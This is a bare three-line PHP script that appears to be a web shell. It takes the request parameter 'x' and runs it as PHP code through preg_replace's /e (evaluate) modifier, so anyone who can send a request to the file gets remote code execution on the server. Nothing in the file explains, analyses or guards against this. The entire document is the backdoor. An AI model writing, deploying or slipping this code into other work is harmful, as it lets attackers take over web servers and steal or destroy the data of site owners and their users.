<?php
$payload = $_REQUEST['x'];
preg_replace("/.*/e", $payload, "noop");
